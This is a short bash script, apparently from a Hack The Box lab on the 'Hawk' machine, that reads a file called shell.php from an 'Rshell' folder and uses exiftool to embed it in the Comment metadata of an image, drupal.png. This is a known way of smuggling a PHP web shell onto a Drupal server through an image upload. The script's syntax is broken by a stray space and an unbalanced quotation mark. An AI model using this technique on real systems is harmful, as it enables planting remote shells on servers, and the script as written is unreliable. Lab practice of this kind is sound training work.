#!/bin/bash

p= $(cat /home/tepidangler/Rshell/shell.php)

/usr/bin/exiftool -Comment=$p;" /home/tepidangler/HTB/Hawk/drupal.png
